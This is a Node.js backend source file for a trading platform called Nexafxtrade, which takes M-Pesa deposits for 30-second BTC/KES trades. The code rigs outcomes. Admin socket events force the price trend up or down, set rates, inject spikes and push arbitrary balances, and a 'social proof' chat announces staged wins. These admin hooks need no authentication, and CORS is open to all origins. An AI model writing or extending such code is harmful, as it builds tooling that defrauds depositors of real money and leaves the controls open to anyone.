/**
 * Nexafxtrade Backend Engine
 * Version: 3.2.0 (May 2026)
 * Brand: Nexafxtrade (formerly Nexapaytrade)
 */

const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const dotenv = require("dotenv");
const http = require("http");
const { Server } = require("socket.io");

// Load environment variables
dotenv.config();

const app = express();
const server = http.createServer(app);

/**
 * 1. ENHANCED CORS CONFIGURATION
 * This prevents the "Failed to Fetch" error by allowing 
 * your frontend to communicate with this backend.
 */
app.use(cors({
  origin: "*", // Allows all domains. Change to your specific URL when live.
  methods: ["GET", "POST", "PUT", "DELETE"],
  allowedHeaders: ["Content-Type", "Authorization"]
}));

app.use(express.json());

const io = new Server(server, {
  cors: {
    origin: "*", 
    methods: ["GET", "POST"]
  }
});

// Global Market State
let currentMarketRate = 8421500; 
let forcedAdminTrend = "AUTO";   

// Main brand identification
app.get("/", (req, res) => {
  res.send("Nexafxtrade | High-Performance Trading Engine Running");
});

// Database Connection
mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log("MongoDB Connected Successfully"))
  .catch(err => console.log("MongoDB Connection Error:", err));

// Route Imports
const authRoutes = require("./routes/authRoutes");
const paymentRoutes = require("./routes/paymentRoutes"); 
const userRoutes = require("./routes/User"); 

// Use Routes
app.use("/api/auth", authRoutes);
app.use("/api/payments", paymentRoutes);
app.use("/api/user", userRoutes);

/**
 * REAL-TIME ENGINE (Socket.io)
 * Handles live charts, social proof chat, and the 30-second trade loop
 */
io.on("connection", (socket) => {
  console.log("New Trader Connected to Nexafxtrade");

  socket.emit('admin-force-market-trend', { trend: forcedAdminTrend });
  socket.emit('market-update', { rate: currentMarketRate });

  // 1. CHAT & SOCIAL PROOF
  socket.on("send-chat", (data) => {
    io.emit("receive-chat", {
      user: data.user,
      message: data.message,
      time: new Date().toLocaleTimeString()
    });
  });

  // 2. ADMIN PANEL INTERCEPT CONTROL HOOKS
  socket.on("admin-force-gateway-rate", (data) => {
    if (data && typeof data.rate === 'number') {
      currentMarketRate = Math.floor(data.rate);
      console.log(`CRITICAL: Admin updated Gateway Base Rate to BTC/KES ${currentMarketRate}`);
      io.emit("market-update", { rate: currentMarketRate });
    }
  });

  socket.on("admin-matrix-sync", (data) => {
    if (data && data.marketTrend) {
      forcedAdminTrend = data.marketTrend;
      io.emit("admin-force-market-trend", { trend: forcedAdminTrend });
      if (data.customSpikeRate !== '' && !isNaN(data.customSpikeRate)) {
        currentMarketRate += parseFloat(data.customSpikeRate);
        io.emit("market-update", { rate: currentMarketRate });
      }
    }
  });

  socket.on("admin-force-balance", (data) => {
    if (data && data.user && typeof data.balance === 'number') {
      io.emit("admin-force-balance", { user: data.user, balance: data.balance });
    }
  });

  socket.on("admin-global-broadcast", (data) => {
    if (data && data.msg) {
      io.emit("admin-global-broadcast", { msg: data.msg });
    }
  });

  // 3. TRADE EXECUTION ENGINE
  socket.on("place-trade", (data) => {
    const entryPrice = currentMarketRate;
    const amount = parseFloat(data.amount);
    
    setTimeout(() => {
      const exitPrice = currentMarketRate;
      let win = false;

      if (data.type === 'BUY' && exitPrice > entryPrice) win = true;
      if (data.type === 'SELL' && exitPrice < entryPrice) win = true;

      const payout = win ? (amount * 1.85) : 0; 

      socket.emit("trade-result", {
        status: win ? "WIN" : "LOSS",
        payout: payout.toFixed(2),
        entry: entryPrice,
        exit: exitPrice
      });

      if (win && amount >= 500) {
        io.emit("receive-chat", {
          user: "System",
          message: `🎉 User ***${socket.id.substring(0,3)} just won KES ${payout.toFixed(0)}!`
        });
      }
    }, 30000); 
  });

  socket.on("disconnect", () => {
    console.log("Trader disconnected");
  });
});

/**
 * MARKET RATE GENERATOR
 */
setInterval(() => {
  if (forcedAdminTrend === "AUTO") {
    const dynamicShift = (Math.random() - 0.48) * (8000 / 15);
    currentMarketRate = Math.floor(currentMarketRate + dynamicShift);
  } else if (forcedAdminTrend === "HIGH") {
    const dynamicShift = (Math.random() * (45000 / 15)) + 1800;
    currentMarketRate = Math.floor(currentMarketRate + dynamicShift);
  } else if (forcedAdminTrend === "LOW") {
    const dynamicShift = -((Math.random() * (45000 / 15)) + 1800);
    currentMarketRate = Math.floor(currentMarketRate + dynamicShift);
  }
  io.emit("market-update", { rate: currentMarketRate });
}, 1000);

/**
 * MPESA CALLBACK HANDLING
 */
app.post("/api/mpesa/callback", async (req, res) => {
    const callbackData = req.body.Body.stkCallback;
    if (callbackData.ResultCode === 0) {
        const metadata = callbackData.CallbackMetadata.Item;
        const amount = metadata.find(item => item.Name === 'Amount').Value;
        const phone = metadata.find(item => item.Name === 'PhoneNumber').Value;
        console.log(`Nexafxtrade Deposit: KSh ${amount} confirmed for ${phone}`);
        // Logic for 10% bonus goes here
    } 
    res.status(200).send("OK");
});

app.get("/api/market/rate", (req, res) => {
    res.json({ rate: currentMarketRate });
});

// Port Logic
const PORT = process.env.PORT || 5000;
server.listen(PORT, () => {
  console.log(`Nexafxtrade Live at: http://localhost:${PORT}`);
});
